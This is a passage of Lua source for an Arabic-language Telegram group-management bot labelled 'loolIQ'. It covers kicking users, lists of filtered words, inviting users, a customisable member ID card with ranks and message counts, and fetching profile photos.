Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ لٱ تستطيع ٱڵـطرد ٱو ٱڵـحظر \n❗️⚠️ ⌯ لٱنة معطـۧڵ من قبل ٱڵمنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not is_admin(ap[2], msg.chat_id_) then
chat_kick(msg.chat_id_, ap[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ The user : '..ap[2]..' \n🏌🏻‍♂️ ⌯ has been kicked \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n📮 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n🏌🏻‍♂️ ⌯ تـۖم طردة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n', 1, 'md')
end end end end
--     Source loolIQ     --
if text:match("^[Ff]ilterlist$") or text:match("^قائمه المنع$") then
local abs = (loolIQ..'bot:filters:'..msg.chat_id_)
if abs then
local names = DevAbs:hkeys(abs)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = "❗️🎒 ⌯ Filterlist : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
else
text = "❗️🎒 ⌯ قٱئمة ٱڵكڵمٱت ٱڵممنوعة : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
end
for i=1, #names do
text = text..'» 🚸 '..names[i]..'\n'
end
if #names == 0 then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = "❗️📛 ⌯ Filterlist is empty "
else
text = "❗️📛 ⌯ لٱ يوجد كڵمٱت ممنوعة "
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end
--     Source loolIQ     --
if text:match("^[Ff]ilterall list$") or text:match("^قائمه المنع العام$") or text:match("^قائمه الفلاتر العام$") then
local abs = (loolIQ..'bot:freewords:')
if abs then
local names = DevAbs:hkeys(abs) 
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '❗️🎒 ⌯ Filter all list : \n〰️➖〰️➖〰️➖〰️➖〰️\n'
else
text = '❗️🎒 ⌯ قٱئمة ٱڵمنع ٱڵعٱم : \n〰️➖〰️➖〰️➖〰️➖〰️\n'
end
for i=1, #names do
text = text..' • '..names[i]..'\n'
end
if #names == 0 then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = "❗️📛 ⌯ Filter all list is empty "
else
text = "❗️📛 ⌯ لٱ يوجد كڵمٱت ممنوعة عٱم "
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('اضافه','Invite')
if text:match("^[Ii]nvite$") and msg.reply_to_message_id_ ~= 0 then
function inv_reply(extra, result, success)
add_user(result.chat_id_, result.sender_user_id_, 5)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
end
--     Source loolIQ     --
if text:match("^[Ii]nvite @(.*)$") then
local ap = {string.match(text, "^([Ii]nvite) @(.*)$")}
function invite_by_username(extra, result, success)
if result.id_ then
add_user(msg.chat_id_, result.id_, 5)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
texts = '❗️☻ User not found '
else
texts = '❗️📛 ⌯ ٱڵمعرف غير صحيح'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
end
resolve_username(ap[2],invite_by_username)
end
end
--     Source loolIQ     --
if text:match("^[Ii]nvite (%d+)$") then
local ap = {string.match(text, "^([Ii]nvite) (%d+)$")}
add_user(msg.chat_id_, ap[2], 5)
end
---
if text:match("^تعيين الايدي$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ رجٱئٱ ٱتبع ٱڵتعڵيمٱت ڵڵتعيين \n❗️🔑 ⌯ ڵطبع كڵيشة ٱلٱيدي ٱرسڵ كڵيشة تحتوي عڵى ٱڵنصوص ٱڵتي بٱڵڵغة ٱلٱنجڵيزية ٱدنٱه \n〰️➖〰️➖〰️➖〰️➖〰️\n username  ⇝ ڵطبع ٱڵمعرف •\n id  ⇝ ڵطبع ٱلٱيدي • \n photos  ⇝ ڵطبع عدد ٱڵصور • \n rank  ⇝ ڵطبع ٱڵـُرتب • \n msgs  ⇝ ڵطبع عدد ٱڵرسٱئڵ • \n formsg  ⇝ ڵطبع ٱڵتفٱعڵ • \n nkat  ⇝ ڵطبع عدد ٱڵنقٱط • \n cont  ⇝ ڵطبع عدد ٱڵجهٱت • \n sticker  ⇝ ڵطبع عدد ٱڵمڵصقٱت • \n〰️➖〰️➖〰️➖〰️➖〰️', 1, 'md')
DevAbs:set("loolIQ:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'ABS_PROX')
return "ABS_PROX"
end
if text and is_owner(msg.sender_user_id_, msg.chat_id_)  and DevAbs:get("loolIQ:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
DevAbs:del("loolIQ:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵجډيډة', 1, 'md')
DevAbs:set("loolIQ:ABS_PROX:id:text:"..bot_id..msg.chat_id_,text)
end
if text:match("^حذف الايدي$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم حـذف كڵيشة ٱلٱيدي ', 1, 'md')
DevAbs:del("loolIQ:ABS_PROX:id:text:"..bot_id..msg.chat_id_)
end
--     Source loolIQ     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and Abbas_Abs(msg) then
function ABS_PROX(extra,result,success)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
local function getpro(extra, result, success) 
local ABS_PROX = DevAbs:get(loolIQ..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local message_edit = DevAbs:get(loolIQ..'bot:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(loolIQ..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local sticker = (tonumber(DevAbs:get(loolIQ.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local user_nkt = tonumber(DevAbs:get(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevAbs:get(loolIQ..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevAbs:get(loolIQ..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
if result.photos_[0] then
if tonumber(msg.sender_user_id_) == tonumber(717869155) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Source programmer'
else
t = 'مطور السورس'
end
elseif is_leader(msg) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = 'المطور الاساسي '
end
elseif is_sudo3(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'ٱڵمطۄر ٱلثٱڵث'
end
elseif is_ownerall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'ٱڵمدير ٱڵعٱم'
end
elseif is_adminall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ٱلٱدمن ٱڵعٱم'
end
elseif is_vipall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'ٱڵمميز ٱڵعٱم'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'ٱڵمنشئ ٱلٱسٱسي'
end
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'ٱڵـۧمـۧنشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'ٱڵـۧمـۧدير'
end
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ٱلٱدمـۧن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي مرتب 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not DevAbs:get('loolIQ:id:mute'..msg.chat_id_) then 
if not DevAbs:get('loolIQ:id:photo'..msg.chat_id_) then 
if not DevAbs:get("loolIQ:ABS_PROX:id:text:"..bot_id..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"\n❗️🚸 ⌯ معرفک ⇜ ◝ "..username.." ◟\n❗️🔑 ⌯ ٱيـډيک ⇜ ◝ "..msg.sender_user_id_.." ◟\n❗️📣 ⌯ رتـبتک ⇜ ◝ "..t.." ◟\n❗️🎗 ⌯ صورک ⇜ ◝ "..result.total_count_.." ◟\n❗️〽️ ⌯ رسٱئڵک ⇜ ◝ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ◟\n❗️⚜️ ⌯ تفٱعڵک ⇜ ◝ "..formsgg(msguser).." ◟\n❗️🔅 ⌯ نقاطک ⇜ ◝ "..user_nkt.." ◟\n〰️➖〰️➖〰️➖〰️➖〰️\n",msg.id_,msg.id_.."")
else 
local new_id = DevAbs:get("loolIQ:ABS_PROX:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('username',(username or 'لا يوجد'))
local new_id = new_id:gsub('photos',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('nkat',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('edit',(message_edit or 'لا يوجد'))
local new_id = new_id:gsub('cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('msgs',(user_msgs + Dev_Abss / ABS_PROX or 'لا يوجد'))
local new_id = new_id:gsub('id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('rank',(t or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if tonumber(msg.sender_user_id_) == tonumber(717869155) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Source programmer'
else
t = 'مطور السورس'
end
elseif is_leader(msg) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = 'المطور الاساسي '
end
elseif is_sudo3(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'ٱڵمطۄر ٱلثٱڵث'
end
elseif is_ownerall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'ٱڵمدير ٱڵعٱم'
end
elseif is_adminall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ٱلٱدمن ٱڵعٱم'
end
elseif is_vipall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'ٱڵمميز ٱڵعٱم'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'ٱڵمنشئ ٱلٱسٱسي'
end
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'ٱڵـۧمـۧنشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'ٱڵـۧمـۧدير'
end
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ٱلٱدمـۧن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي مرتب 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not DevAbs:get("loolIQ:ABS_PROX:id:text:"..bot_id..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "\n❗️🚸 ⌯ معرفک ⇜ ◝ "..username.." ◟\n❗️🔑 ⌯ ٱيـډيک ⇜ ◝ "..msg.sender_user_id_.." ◟\n❗️📣 ⌯ رتـبتک ⇜ ◝ "..t.." ◟\n❗️🎗 ⌯ صورک ⇜ ◝ "..result.total_count_.." ◟\n❗️〽️ ⌯ رسٱئڵک ⇜ ◝ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ◟\n❗️⚜️ ⌯ تفٱعڵک ⇜ ◝ "..formsgg(msguser).." ◟\n❗️📯 ⌯ جـهٱتک ⇜ ◝ "..cont.." ◟\n❗️🔅 ⌯ نقاطک ⇜ ◝ "..user_nkt.." ◟\n❗️🛎 ⌯ مڵصقٱتک ⇜ ◝ "..sticker.." ◟\n〰️➖〰️➖〰️➖〰️➖〰️\n", 1, 'html')
else
local new_id = DevAbs:get("loolIQ:ABS_PROX:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('username',(username or 'لا يوجد'))
local new_id = new_id:gsub('photos',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('nkat',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('edit',(message_edit or 'لا يوجد'))
local new_id = new_id:gsub('cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('msgs',(user_msgs + Dev_Abss / ABS_PROX or 'لا يوجد'))
local new_id = new_id:gsub('id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('rank',(t or 'لا يوجد'))
Dev_Abs(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ID disabled  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ عذرٱ ٱلٱيدي مۘعطڵ ', 1, 'md')
end
end
else
if tonumber(msg.sender_user_id_) == tonumber(717869155) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Source programmer'
else
t = 'مطور السورس'
end
elseif is_leader(msg) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = 'المطور الاساسي '
end
elseif is_sudo3(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'ٱڵمطۄر ٱلثٱڵث'
end
elseif is_ownerall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'ٱڵمدير ٱڵعٱم'
end
elseif is_adminall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ٱلٱدمن ٱڵعٱم'
end
elseif is_vipall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'ٱڵمميز ٱڵعٱم'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'ٱڵمنشئ ٱلٱسٱسي'
end
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'ٱڵـۧمـۧنشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'ٱڵـۧمـۧدير'
end
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ٱلٱدمـۧن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي مرتب 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not DevAbs:get('loolIQ:id:mute'..msg.chat_id_) then
if not DevAbs:get('loolIQ:id:photo'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️⚠️ ⌯ You don'n have a personal picture \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️🚸 ⌯ User name : { "..username.." }\n❗️🗽 ⌯ Photo : { "..result.total_count_.." }\n❗️🏮 ⌯ Point : { "..user_nkt.." }\n❗️🗽 ⌯ Contacts : { "..cont.." }\n❗️🧩 ⌯ Sticker : { "..sticker.." }\n❗️🔎 ⌯ Msg : { "..user_msgs.." }\n❗️🧬 ⌯ ID : { "..msg.sender_user_id_.." }\n❗️🔮 ⌯ interaction : { "..formsgg(msguser).." }\n❗️💎 ⌯ Renk : { "..t.." }\n〰️➖〰️➖〰️➖〰️➖〰️\n", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️⚠️ ⌯ لٱ ٱستطيع عرض صورتک \n❗️📛 ⌯ ربمٱ لٱ تمتڵك صورة شخصية \n❗️📛 ⌯ ٱو ٱنك قمت بحظر ٱڵـبوت \n❗️📛 ⌯ ٱو ٱنك قفڵتهٱ من ٱلٱعدٱدٱت \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️🚸 ⌯ معرفک ⇜ ◝ "..username.." ◟\n❗️🔑 ⌯ ٱيـډيک ⇜ ◝ "..msg.sender_user_id_.." ◟\n❗️📣 ⌯ رتـبتک ⇜ ◝ "..t.." ◟\n❗️🎗 ⌯ صورک ⇜ ◝ "..result.total_count_.." ◟\n❗️〽️ ⌯ رسٱئڵک ⇜ ◝ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ◟\n❗️⚜️ ⌯ تفٱعڵک ⇜ ◝ "..formsgg(msguser).." ◟\n❗️📯 ⌯ جـهٱتک ⇜ ◝ "..cont.." ◟\n❗️🔅 ⌯ نقاطک ⇜ ◝ "..user_nkt.." ◟\n❗️🛎 ⌯ مڵصقٱتک ⇜ ◝ "..sticker.." ◟\n〰️➖〰️➖〰️➖〰️➖〰️\n", 1, 'html')
end
else
if tonumber(msg.sender_user_id_) == tonumber(717869155) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Source programmer'
else
t = 'مطور السورس'
end
elseif is_leader(msg) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = 'المطور الاساسي '
end
elseif is_sudo3(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'ٱڵمطۄر ٱلثٱڵث'
end
elseif is_ownerall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'ٱڵمدير ٱڵعٱم'
end
elseif is_adminall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ٱلٱدمن ٱڵعٱم'
end
elseif is_vipall(msg.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'ٱڵمميز ٱڵعٱم'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'ٱڵمنشئ ٱلٱسٱسي'
end
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'ٱڵـۧمـۧنشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'ٱڵـۧمـۧدير'
end
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ٱلٱدمـۧن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي مرتب 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز' 
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ User name : { "..username.." }\n❗️🗽 ⌯ Photo : { "..result.total_count_.." }\n❗️🏮 ⌯ Point : { "..user_nkt.." }\n❗️🗽 ⌯ Contacts : { "..cont.." }\n❗️🧩 ⌯ Sticker : { "..sticker.." }\n❗️🔎 ⌯ Msg : { "..user_msgs.." }\n❗️🧬 ⌯ ID : { "..msg.sender_user_id_.." }\n❗️🔮 ⌯ interaction : { "..formsgg(msguser).." }\n❗️💎 ⌯ Renk : { "..t.." }\n〰️➖〰️➖〰️➖〰️➖〰️\n", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "\n❗️🚸 ⌯ معرفک ⇜ ◝ "..username.." ◟\n❗️🔑 ⌯ ٱيـډيک ⇜ ◝ "..msg.sender_user_id_.." ◟\n❗️📣 ⌯ رتـبتک ⇜ ◝ "..t.." ◟\n❗️🎗 ⌯ صورک ⇜ ◝ "..result.total_count_.." ◟\n❗️〽️ ⌯ رسٱئڵک ⇜ ◝ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ◟\n❗️⚜️ ⌯ تفٱعڵک ⇜ ◝ "..formsgg(msguser).." ◟\n❗️📯 ⌯ جـهٱتک ⇜ ◝ "..cont.." ◟\n❗️🔅 ⌯ نقاطک ⇜ ◝ "..user_nkt.." ◟\n❗️🛎 ⌯ مڵصقٱتک ⇜ ◝ "..sticker.." ◟\n〰️➖〰️➖〰️➖〰️➖〰️\n", 1, 'html')
end
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ID disabled  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ عذرٱ ٱلٱيدي مۘعطڵ ', 1, 'md')
end end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1
}, getpro, nil)
end
getUser(msg.sender_user_id_, ABS_PROX)
end
end 
--     Source loolIQ     --
if text == "صورتي" and not DevAbs:get(loolIQ.."lock:get:photo"..msg.chat_id_)  then 
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ فـي حسٱبك ( "..result.total_count_.." ) من ٱڵـصور‌‏ ", msg.id_, msg.id_, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ ٱنت لٱ تمتڵك صورة شخصية ", 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end 
if text:match("^صورتي (%d+)$") then
local ABSendPhoto = {string.match(text, "^(صورتي) (%d+)$")}
local function gproen(extra, result, success)
if not is_admin(msg.sender_user_id_, msg.chat_id_) and DevAbs:get(loolIQ.."lock:get:photo"..msg.chat_id_)  then 
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ Get profile photo is deactive ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '️❗️🚸 ⌯ عذرٱ جڵب ٱڵـصور ٱڵشخصية مۘعطڵ ', 1, 'md')
end
else
if ABSendPhoto[2] == '1' then
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 1 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ You don't have profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ ٱنت لٱ تمتڵك صورة شخصية ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '2' then
if result.photos_[1] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 2 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 2 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من صورتين ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '3' then
if result.photos_[2] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 3 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 3 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 3 ) صور ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '4' then
if result.photos_[3] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 4 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't have 4 profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 4 ) صور ", 1, 'md')
end
end
elseif ABSendPhoto[2] == '5' then
if result.photos_[4] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_,"❗️🚸 ⌯ صورتك رقم ( 5 )", msg.id_, msg.id_, "md")
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ You don't 5 have profile photo ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱنت لٱ تمتڵك ٱكثر من ( 5 ) صور ", 1, 'md')
end
end
